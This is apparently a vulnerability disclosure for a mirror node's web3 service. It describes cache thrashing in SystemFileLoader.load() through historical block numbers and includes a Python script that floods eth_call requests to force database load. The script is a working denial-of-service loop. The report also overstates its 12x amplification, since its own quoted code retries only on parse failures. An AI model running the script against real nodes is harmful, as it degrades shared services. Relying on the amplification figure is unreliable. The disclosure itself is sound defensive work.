### Title
Cache Thrashing via Historical Timestamp Diversity Causes Amplified DB Queries in `SystemFileLoader.load()`

### Summary
The `exchangeRatesCacheManager` in `SystemFileLoader.load()` uses a `CacheKey(fileId, roundedHourTimestamp)` with a hard cap of 20 entries (`maximumSize=20`). An unprivileged user can supply historical block numbers spanning more than 20 distinct hours via public eth_call/eth_estimateGas endpoints, filling and continuously evicting the cache. Every eviction causes a DB fallback that invokes `loadWithRetry()`, which issues up to `maxFileAttempts=12` sequential DB queries per cache miss, amplifying database load by up to 12× per request.

### Finding Description

**Exact code path:**

`web3/src/main/java/org/hiero/mirror/web3/state/SystemFileLoader.java`, `load(FileID, long)`, lines 113–141:

```java
if (fileId.equals(exchangeRateFileId) || ...) {
    cacheManager = exchangeRatesCacheManager;
    consensusTimestamp = roundDownToHour(consensusTimestamp); // line 117
}
final var cacheKey = new CacheKey(fileId, consensusTimestamp); // line 120
var file = cache.get(cacheKey, File.class);                    // line 129
if (file != null) { return file; }
var result = loadFromDB(fileId, consensusTimestamp);           // line 135 — DB hit
```

`loadFromDB` calls `loadWithRetry()` (line 150), which executes up to `maxFileAttempts` (default **12**) calls to `fileDataRepository.getFileAtTimestamp()` (lines 172–193) on each `ParseException`.

**Cache configuration** (`web3/src/main/java/org/hiero/mirror/web3/repository/properties/CacheProperties.java`, line 36):
```java
private String fee = "expireAfterWrite=60m,maximumSize=20,recordStats";
```

**Root cause:** The cache key space is unbounded (any historical hour maps to a unique key), but the cache capacity is fixed at 20. Caffeine's eviction policy will discard entries once the limit is reached. There is no guard preventing an attacker from generating more than 20 distinct hourly keys, and no synchronization/lock prevents concurrent threads from all missing the cache simultaneously for the same key and all issuing DB queries.

**Why existing checks fail:** The `ThrottleManagerImpl` throttles on gas consumption, not on the number of unique historical timestamps queried. There is no per-IP rate limit, no restriction on the range of historical block numbers accepted, and no deduplication of concurrent cache-miss DB fetches (no "cache stampede" protection — the code does a plain `cache.get()` then `loadFromDB()` without any locking).

### Impact Explanation
Each cache miss for an exchange-rate/fee-schedule file triggers up to 12 sequential `getFileAtTimestamp` DB queries. With a cache of only 20 slots and 3 file IDs (exchangeRate, feeSchedule, simpleFeeSchedule), an attacker cycling through 7+ distinct hours per file type can keep all 20 slots in constant churn. At moderate concurrency (e.g., 50 parallel requests each targeting a different hour), the DB receives up to 600 queries per request batch instead of 0 (cache hits). This constitutes a non-network-based DoS against the database layer, degrading or blocking all other mirror-node services sharing the same DB.

### Likelihood Explanation
The web3 JSON-RPC endpoint (`eth_call`, `eth_estimateGas`) is publicly accessible with no authentication. Historical block numbers are publicly enumerable from the chain. The attacker needs only a script that cycles through block numbers from different hours (e.g., one block per hour going back years). No special privileges, tokens, or insider knowledge are required. The attack is trivially repeatable and automatable.

### Recommendation
1. **Increase cache size** to cover the realistic historical query range (e.g., `maximumSize=8760` for one year of hourly slots), or use `expireAfterAccess` instead of `expireAfterWrite` so hot historical slots stay cached.
2. **Add cache stampede protection**: use a `ConcurrentHashMap<CacheKey, CompletableFuture<File>>` or Caffeine's `AsyncLoadingCache` so concurrent misses for the same key share a single DB fetch.
3. **Bound the historical timestamp range**: reject or cap `consensusTimestamp` values older than a configurable window (e.g., 24 hours) at the controller/service layer before they reach `SystemFileLoader`.
4. **Add per-IP or per-request rate limiting** on the number of distinct historical timestamps accepted within a time window.

### Proof of Concept

```python
import requests, json, time

RPC = "http://<mirror-node-web3>:8545"

# Hedera mainnet: ~1 block per second, 3600 blocks per hour
# Pick 25 block numbers each from a different hour, going back years
hours_back = list(range(1, 26))  # 25 distinct hours
base_block = 50_000_000          # recent block (hex below)

def eth_call_at_block(block_hex):
    payload = {
        "jsonrpc": "2.0", "id": 1, "method": "eth_call",
        "params": [
            {"to": "0x0000000000000000000000000000000000000167",  # exchange rate precompile
             "data": "0x10e7e7d5"},  # getExchangeRate()
            block_hex
        ]
    }
    return requests.post(RPC, json=payload, timeout=30)

# Phase 1: fill the 20-slot cache with 20 distinct hourly timestamps
for i in range(20):
    block = hex(base_block - i * 3600)
    eth_call_at_block(block)

# Phase 2: continuously evict by introducing new hourly timestamps
# Each new request causes a cache miss → up to 12 DB queries
while True:
    for i in range(25):  # 25 > 20, guarantees eviction on every cycle
        block = hex(base_block - i * 3600)
        eth_call_at_block(block)
    # DB query rate: 25 requests × up to 12 retries = up to 300 DB queries per cycle
    time.sleep(0.1)
```

    private File loadWithRetry(final FileID key, final long currentTimestamp, SystemFile systemFile) {
        final var nanoSeconds = new AtomicLong(currentTimestamp);
        final var fileId = toEntityId(key).getId();
        final var attempt = new AtomicInteger(0);

        try {
            return getRetryTemplate().execute(() -> fileDataRepository
                    .getFileAtTimestamp(fileId, nanoSeconds.get())
                    .filter(fileData -> ArrayUtils.isNotEmpty(fileData.getFileData()))
                    .map(fileData -> {
                        try {
                            var bytes = Bytes.wrap(fileData.getFileData());
                            var codec = systemFile.codec;
                            if (codec != null) {
                                codec.parse(bytes.toReadableSequentialData());
                            }
                            return File.newBuilder().contents(bytes).fileId(key).build();
                        } catch (ParseException e) {
                            log.warn(
                                    "Failed to parse file data for fileId {} at {}, retry attempt {}. Exception: ",
                                    fileId,
                                    nanoSeconds.get(),
                                    attempt.incrementAndGet(),
                                    e);
                            nanoSeconds.set(fileData.getConsensusTimestamp() - 1);
                            throw new InvalidFileException(e);
                        }
                    })
                    .orElse(systemFile.genesisFile()));
        } catch (RetryException e) {
            return systemFile.genesisFile();
        }
